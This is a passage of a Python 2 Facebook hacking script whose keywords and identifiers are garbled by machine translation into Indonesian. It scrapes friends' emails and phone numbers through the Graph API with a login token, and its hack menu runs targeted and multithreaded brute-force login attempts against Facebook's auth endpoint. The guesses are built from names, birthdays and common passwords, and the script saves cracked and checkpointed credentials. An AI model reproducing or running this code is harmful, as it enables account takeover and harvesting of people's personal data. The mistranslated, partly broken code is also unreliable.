		membuang()
	kecuali KeyError:
		print('\033[1;91m[!] Kesalahan')
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali request.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()

##### EMAIL DARI TEMAN #####
def emailfrom_teman():
	os.sistem('setel ulang')
	mencoba:
		toket=open('login.txt','r').read()
	kecuali IOError:
		print"\033[1;91m[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		waktu.tidur(1)
		Gabung()
	mencoba:
		os.mkdir('keluar')
	kecuali OSError:
		lulus
	mencoba:
		os.sistem('setel ulang')
		cetak logo
		idt = raw_input("\033[1;91m[+] \033[1;92mMasukkan ID teman \033[1;91m: \033[1;97m")
		mencoba:
			jok = request.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDari\033[1;91m :\033[1;97m "+op["nama"]
		kecuali KeyError:
			print"\033[1;91m[!] Teman tidak ditemukan"
			raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
			membuang()
		r = request.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.teks)
		jalan('\033[1;91m[✺] \033[1;92mDapatkan semua email teman dari teman \033[1;97m...')
		cetak 42*"\033[1;97m═"
		bz = buka('keluar/em_teman_from_teman.txt','w')
		untuk saya di ['data']:
			x = request.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.teks)
			mencoba:
				emfromteman.append(z['email'])
				bz.tulis(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(temanteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m "+z['email']+" | "+z['nama']+"\n"),;sys.stdout.flush();time.sleep(0,0001)
			kecuali KeyError:
				lulus
		bz.tutup()
		cetak 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mBerhasil mendapatkan email \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emfromteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSimpan file dengan nama\033[1;91m :\033[1;97m ")
		os.rename('out/em_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile disimpan \033[1;91m: \033[1;97mout/"+selesai)
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali IOError:
		print"\033[1;91m[!] Kesalahan saat membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali KeyError:
		print('\033[1;91m[!] Kesalahan')
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali request.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()
		
##### NOMER #####
def nomor_hp():
	os.sistem('setel ulang')
	mencoba:
		toket=open('login.txt','r').read()
	kecuali IOError:
		print"\033[1;91m[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		waktu.tidur(1)
		Gabung()
	mencoba:
		os.mkdir('keluar')
	kecuali OSError:
		lulus
	mencoba:
		os.sistem('setel ulang')
		cetak logo
		jalan('\033[1;91m[✺] \033[1;92mDapatkan semua nomor telepon teman \033[1;97m...')
		cetak 42*"\033[1;97m═"
		url= "https://graph.facebook.com/me/friends?access_token="+toket
		r =permintaan.get(url)
		z=json.loads(r.teks)
		bz = buka('keluar/nomer_teman.txt','w')
		untuk n dalam z["data"]:
			x = request.get("https://graph.facebook.com/"+n['id']+"?access_token="+toket)
			z = json.loads(x.teks)
			mencoba:
				hp.append(z['mobile_phone'])
				bz.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(hp))+"\033[1;97m ]\033[1;97m=> \033[1;97m ]\033[1;97m=> \033[1;97m "+z['ponsel_ponsel']+" | "+z['nama']+"\n"),;sys.stdout.flush();time.sleep(0,0001)
			kecuali KeyError:
				lulus
		bz.tutup()
		cetak 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mBerhasil mendapatkan nomor \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mJumlah Total \033[1;91m: \033[1;97m%s"%(len(hp))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSimpan file dengan nama\033[1;91m :\033[1;97m ")
		os.rename('out/nomer_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile disimpan \033[1;91m: \033[1;97mout/"+selesai)
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali IOError:
		print"\033[1;91m[!] Kesalahan saat membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali KeyError:
		print('\033[1;91m[!] Kesalahan')
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali request.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()

##### NOMER DARI TEMAN #####
def hpfrom_teman():
	os.sistem('setel ulang')
	mencoba:
		toket=open('login.txt','r').read()
	kecuali IOError:
		print"\033[1;91m[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		waktu.tidur(1)
		Gabung()
	mencoba:
		os.mkdir('keluar')
	kecuali OSError:
		lulus
	mencoba:
		os.sistem('setel ulang')
		cetak logo
		idt = raw_input("\033[1;91m[+] \033[1;92mMasukkan ID teman \033[1;91m: \033[1;97m")
		mencoba:
			jok = request.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDari\033[1;91m :\033[1;97m "+op["nama"]
		kecuali KeyError:
			print"\033[1;91m[!] Teman tidak ditemukan"
			raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
			membuang()
		r = request.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.teks)
		jalan('\033[1;91m[✺] \033[1;92mDapatkan semua nomor teman dari teman \033[1;97m...')
		cetak 42*"\033[1;97m═"
		bz = buka('keluar/no_teman_from_teman.txt','w')
		untuk saya di ['data']:
			x = request.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.teks)
			mencoba:
				hpfromteman.append(z['mobile_phone'])
				bz.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(hpfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m "+z['ponsel_ponsel']+" | "+z['nama']+"\n"),;sys.stdout.flush();time.sleep(0,0001)
			kecuali KeyError:
				lulus
		bz.tutup()
		cetak 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mBerhasil mendapatkan nomor \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mJumlah Total \033[1;91m: \033[1;97m%s"%(len(hpfromteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSimpan file dengan nama\033[1;91m :\033[1;97m ")
		os.rename('out/no_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile disimpan \033[1;91m: \033[1;97mout/"+selesai)
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali IOError:
		print"\033[1;91m[!] Kesalahan saat membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali KeyError:
		print('\033[1;91m[!] Kesalahan')
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali request.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()
    
##### MENU HACK #####
def menu_hack():
	os.sistem('setel ulang')
	mencoba:
		toket=open('login.txt','r').read()
	kecuali IOError:
		print"\033[1;91m[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		waktu.tidur(1)
		Gabung()
	os.sistem('setel ulang')
	cetak logo
	print "\033[1;93m║--\033[1;93m> \033[1;93m1.\033[1;94m Mini Hack Facebook(\033[1;92mTarget\033[1;97m))"
	print "\033[1;93m║--\033[1;93m> \033[1;93m2.\033[1;94m Multi Bruteforce Facebook"
	print "\033[1;93m║--\033[1;93m> \033[1;93m3.\033[1;94m Super Multi Bruteforce Facebook"
	print "\033[1;93m║--\033[1;93m> \033[1;93m4.\033[1;94m BruteForce(\033[1;92mTarget\033[1;97m))"
	print "\033[1;93m║--\033[1;93m> \033[1;93m5.\033[1;94m Yahoo Checker"
	print "\033[1;93m║--\033[1;93m> \033[1;93m0.\033[1;94m Kembali"
	cetak "║"
	hack_pilih()
#----pilih
def hack_pilih():
	hack = raw_input("\033[1;95m╚═\033[1;95mD \033[1;95m")
	jika diretas ="":
		print "\033[1;91m[!] Masukan salah"
		hack_pilih()
	elif hack ="1":
		mini()
	elif hack ="2":
		retakan()
		hasil()
	elif hack ="3":
		super()
	elif hack ="4":
		kasar()
	elif hack ="5":
		menu_yahoo()
	elif hack ="0":
		Tidak bisa()
	kalau tidak:
		print "\033[1;91m[!] Masukan salah"
		hack_pilih()
		
##### MINI HF #####
def mini():
	os.sistem('setel ulang')
	mencoba:
		toket=open('login.txt','r').read()
	kecuali IOError:
		print"\033[1;91m[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		waktu.tidur(1)
		Gabung()
	os.sistem('setel ulang')
	cetak logo
	print "\033[1;97m[\033[1;91mINFO\033[1;97m] \033[1;91mAkun target harus berteman\n dengan akunmu dulu!"
	cetak 42*"\033[1;97m═"
	mencoba:
		id = raw_input("\033[1;91m[+] \033[1;92mTarget ID \033[1;91m:\033[1;97m ")
		jalan('\033[1;91m[✺] \033[1;92mTunggu sebentar \033[1;97m...')
		r = request.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		a = json.loads(r.teks)
		print '\033[1;91m[➹] \033[1;92mNama\033[1;97m : '+a['nama']
		jalan('\033[1;91m[+] \033[1;92mPeriksa \033[1;97m...')
		waktu.tidur(2)
		jalan('\033[1;91m[+] \033[1;92mBuka kata sandi \033[1;97m...')
		waktu.tidur(2)
		cetak 42*"\033[1;97m═"
		pz1 = a['nama_pertama']+'123'
		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"(&locale )+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		y = json.load(data)
		jika 'access_token' di y:
			print "\033[1;91m[+] \033[1;92mDitemukan"
			print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m : "+a['nama']
			print "\033[1;91m[➹] \033[1;92mNama Pengguna\033[1;97m : "+id
			print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
			raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
			menu_hack()
		kalau tidak:
			jika 'www.facebook.com' di y["error_msg"]:
				print "\033[1;91m[+] \033[1;92mDitemukan"
				print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
				print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m : "+a['nama']
				print "\033[1;91m[➹] \033[1;92mNama Pengguna\033[1;97m : "+id
				print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
				raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
				menu_hack()
			kalau tidak:
				pz2 = a['nama_pertama'] + '12345'
				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"(&locale )+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				y = json.load(data)
				jika 'access_token' di y:
					print "\033[1;91m[+] \033[1;92mDitemukan"
					print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m : "+a['nama']
					print "\033[1;91m[➹] \033[1;92mNama Pengguna\033[1;97m : "+id
					print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
					raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
					menu_hack()
				kalau tidak:
					jika 'www.facebook.com' di y["error_msg"]:
						print "\033[1;91m[+] \033[1;92mDitemukan"
						print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
						print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m : "+a['nama']
						print "\033[1;91m[➹] \033[1;92mNama Pengguna\033[1;97m : "+id
						print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
						raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
						menu_hack()
					kalau tidak:
						pz3 = a['nama_belakang'] + '123'
						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"(&locale )+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
						y = json.load(data)
						jika 'access_token' di y:
							print "\033[1;91m[+] \033[1;92mDitemukan"
							print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m : "+a['nama']
							print "\033[1;91m[➹] \033[1;92mNama Pengguna\033[1;97m : "+id
							print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
							raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
							menu_hack()
						kalau tidak:
							jika 'www.facebook.com' di y["error_msg"]:
								print "\033[1;91m[+] \033[1;92mDitemukan"
								print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
								print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m : "+a['nama']
								print "\033[1;91m[➹] \033[1;92mNama Pengguna\033[1;97m : "+id
								print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
								raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
								menu_hack()
							kalau tidak:
								lahir = a['ulang tahun']
								pz4 = lahir.replace('/', '')
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"(&locale )+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								y = json.load(data)
								jika 'access_token' di y:
									print "\033[1;91m[+] \033[1;92mDitemukan"
									print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m : "+a['nama']
									print "\033[1;91m[➹] \033[1;92mNama Pengguna\033[1;97m : "+id
									print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
									raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
									menu_hack()
								kalau tidak:
									jika 'www.facebook.com' di y["error_msg"]:
										print "\033[1;91m[+] \033[1;92mDitemukan"
										print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
										print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m : "+a['nama']
										print "\033[1;91m[➹] \033[1;92mNama Pengguna\033[1;97m : "+id
										print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
										raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
										menu_hack()
									kalau tidak:
										lahir = a['ulang tahun']
										gaz = lahirs.replace('/', '')
										pz5 = a['nama_pertama']+gaz
										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"(&locale )+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
										y = json.load(data)
										jika 'access_token' di y:
											print "\033[1;91m[+] \033[1;92mDitemukan"
											print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m : "+a['nama']
											print "\033[1;91m[➹] \033[1;92mNama Pengguna\033[1;97m : "+id
											print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
											raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
											menu_hack()
										kalau tidak:
											jika 'www.facebook.com' di y["error_msg"]:
												print "\033[1;91m[+] \033[1;92mDitemukan"
												print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
												print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m : "+a['nama']
												print "\033[1;91m[➹] \033[1;92mNama Pengguna\033[1;97m : "+id
												print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
												raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
												menu_hack()
											kalau tidak:
												pz6 = "oiboy123"
												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"(&locale )+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
												y = json.load(data)
												jika 'access_token' di y:
													print "\033[1;91m[+] \033[1;92mDitemukan"
													print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m : "+a['nama']
													print "\033[1;91m[➹] \033[1;92mNama Pengguna\033[1;97m : "+id
													print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
													raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
													menu_hack()
												kalau tidak:
													jika 'www.facebook.com' di y["error_msg"]:
														print "\033[1;91m[+] \033[1;92mDitemukan"
														print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
														print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m : "+a['nama']
														print "\033[1;91m[➹] \033[1;92mNama Pengguna\033[1;97m : "+id
														print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
														raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
														menu_hack()
													kalau tidak:
														pz7 = "sayang123"
														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"(&locale )+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
														y = json.load(data)
														jika 'access_token' di y:
															print "\033[1;91m[+] \033[1;92mDitemukan"
															print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m : "+a['nama']
															print "\033[1;91m[➹] \033[1;92mNama Pengguna\033[1;97m : "+id
															print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz7
															raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
															menu_hack()
														kalau tidak:
															jika 'www.facebook.com' di y["error_msg"]:
																print "\033[1;91m[+] \033[1;92mDitemukan"
																print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
																print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m : "+a['nama']
																print "\033[1;91m[➹] \033[1;92mNama Pengguna\033[1;97m : "+id
																print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
																raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
																menu_hack()
															kalau tidak:
																print "\033[1;91m[!] Maaf, gagal membuka kata sandi target :("
																print "\033[1;91m[!] coba dengan cara lain."
																raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
																menu_hack()
	kecuali KeyError:
		print "\033[1;91m[!] Terget tidak ditemukan"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		menu_hack()
										
								
##### Multi Brute Force #####
##### RETAKAN ####
def retak():
	idlist global, passw, file
	os.sistem('setel ulang')
	mencoba:
		toket=open('login.txt','r').read()
	kecuali IOError:
		print"\033[1;91m[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		waktu.tidur(1)
		Gabung()
	os.sistem('setel ulang')
	cetak logo
	idlist = raw_input('\033[1;91m[+] \033[1;92mID File \033[1;91m: \033[1;97m')
	passw = raw_input('\033[1;91m[+] \033[1;92mPassword \033[1;91m: \033[1;97m')
	mencoba:
		file = buka((idlist), "r")
		jalan('\033[1;91m[✺] \033[1;92mMulai \033[1;97m...')
		untuk x dalam rentang (40):
			zedd = threading.Thread(target=scrak, args=())
			zedd.mulai()
			utas.tambahkan(zedd)
		untuk zedd di utas:
			zedd.bergabung()
	kecuali IOError:
		print ("\033[1;91m[!] Berkas tidak ditemukan")
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		menu_hack()
		
def scrak():
	global berhasil,cekpoint,gagal,back,up
	mencoba:
		os.mkdir('keluar')
	kecuali OSError:
		lulus
	mencoba:
		buka = ​​buka(idlist, "r")
		atas = buka.read().split()
		sementara file:
			nama pengguna = file.readline().strip()
			url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(nama pengguna)+"&locale=en_(US&sandi) =ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
			data = urllib.urlopen(url)
			mpsh = json.load(data)
			jika kembali == (len(atas)):
				merusak
			jika 'access_token' di mpsh:
				bisa = open("keluar/mbf_ok.txt", "w")
				bisa.write(nama pengguna+"|"+passw+"\n")
				bisa.close()
				x = request.get("https://graph.facebook.com/"+username+"?access_token="+mpsh['access_token'])
				z = json.loads(x.teks)
				berhasil.append("\033[1;97m[ \033[1;92mOK✓\033[1;97m ] "+username+"|" +passw+" =>"+z['name'])
			elif 'www.facebook.com' di mpsh["error_msg"]:
				cek = buka("keluar/mbf_cp.txt", "w")
				cek.write(nama pengguna+"|"+passw+"\n")
				cek.close()
				cekpoint.append("\033[1;97m[ \033[1;93mCP✚\033[1;97m ] "+namapengguna+"|" +passw)
			kalau tidak:
				gagal.append(nama pengguna)
				kembali +=1
			sys.stdout.write('\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack \033[1;91m:\033[1;97m ' +str(kembali)+' \033[1;96m>\033[1;97m '+str(len(naik))+' =>\033[1;92mLive\033[1;91m:\033[1 ;96m'+str(len(berhasil))+' \033[1;97m=>\033[1;93mCheck\033[1;91m:\033[1;96m'+str(len(cekpoint)))) ;sys.stdout.flush()
	kecuali IOError:
		print"\n\033[1;91m[!] Tidur"
		waktu.tidur(1)
	kecuali request.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		
def hasil():
	mencetak
	cetak 42*"\033[1;97m═"
	###Berhasil
	untuk b di berhasil:
		cetak (b)
	###CEK
	untuk c di cekpoint:
		cetak (c)
	###Gagal
	cetak 42*"\033[1;97m═"
	print ("\033[31m[x] Gagal \033[1;97m--> " + str(len(gagal)))
	keluar()
	
############### SUPER MBF ######################
def super():
	toket global
	os.sistem('setel ulang')
	mencoba:
		toket=open('login.txt','r').read()
	kecuali IOError:
		print"\033[1;91m[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		waktu.tidur(1)
		Gabung()
	os.sistem('setel ulang')
	cetak logo
	print "\033[1;95m║--\033[1;91m> \033[1;96m1.\033[1;93m Retak dengan teman daftar"
	print "\033[1;95m║--\033[1;91m> \033[1;96m2.\033[1;93m Retak dari teman"
	print "\033[1;95m║--\033[1;91m> \033[1;96m3.\033[1;93m Crack dari member group"
	print "\033[1;95m║--\033[1;91m> \033[1;96m0.\033[1;93m Kembali"
	cetak "║"
	pilih_super()

def pilih_super():
	puncak = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	jika puncak ="":
		print "\033[1;91m[!] Masukan salah"
		pilih_super()
	puncak elif ="1":
		os.sistem('setel ulang')
		cetak logo
		jalan('\033[1;94m[✺] \033[1;96mDapatkan semua id teman \033[1;95m...')
		r = request.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.teks)
		untuk s dalam z['data']:
			id.append(s['id'])
	puncak elif ="2":
		os.sistem('setel ulang')
		cetak logo
		idt = raw_input("\033[1;91m[+] \033[1;92mMasukkan ID teman \033[1;91m: \033[1;97m")
		mencoba:
			jok = request.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDari\033[1;91m :\033[1;97m "+op["nama"]
		kecuali KeyError:
			print"\033[1;91m[!] Teman tidak ditemukan"
			raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
			super()
		jalan('\033[1;91m[✺] \033[1;92mDapatkan semua id dari teman \033[1;97m...')
		r = request.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.teks)
		untuk saya di z['data']:
			id.append(i['id'])
	puncak elif ="3":
		os.sistem('setel ulang')
		cetak logo
		idg=raw_input('\033[1;91m[+] \033[1;92mGrup ID masukan \033[1;91m:\033[1;97m ')
		mencoba:
			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
			asw=json.loads(r.teks)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDari grup \033[1;91m:\033[1;97m "+asw['nama'] ]
		kecuali KeyError:
			print"\033[1;91m[!] Grup tidak ditemukan"
			raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
			super()
		jalan('\033[1;91m[✺] \033[1;92mDapatkan id anggota grup \033[1;97m...')
		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.teks)
		untuk p dalam s['data']:
			id.append(p['id'])
	puncak elif ="0":
		menu_hack()
	kalau tidak:
		print "\033[1;91m[!] Masukan salah"
		pilih_super()
		
	print "\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
	jalan('\033[1;91m[✺] \033[1;92mMulai \033[1;97m...')
	titik = ['. ','.. ','... ']
	untuk o di titik:
		print("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack \033[1;97m"+o),;sys.stdout.flush( );waktu.tidur(1)
	mencetak
	cetak 42*"\033[1;97m═"
	
			
	##### retakan #####
	def utama(arg):
		cekpoint global, ok
		pengguna = argumen
		mencoba:
			os.mkdir('keluar')
		kecuali OSError:
			lulus
		mencoba:
			#Lulus1
			a = request.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.teks)
			pass1 = b['nama_pertama']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"(US&locale )+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			jika 'access_token' di q:
				x = request.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.teks)
				print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+pengguna+" 😁 " +pass1+" =>"+z['nama'])
				oks.append(pengguna+pass1)
			kalau tidak:
				jika 'www.facebook.com' di q["error_msg"]:
					cek = open("keluar/super_cp.txt", "a")
					cek.write(pengguna+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(pengguna+pass1)
				kalau tidak:
					#Lulus2
					pass2 = b['nama_pertama']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"(US&locale )+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					jika 'access_token' di q:
						x = request.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
						z = json.loads(x.teks)
						print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass2+" =>"+z['name'])
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							cek = open("out/super_cp.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							#Pass3
							pass3 = b['last_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
								z = json.loads(x.text)
								print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass3+" =>"+z['name'])
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									cek = open("out/super_cp.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
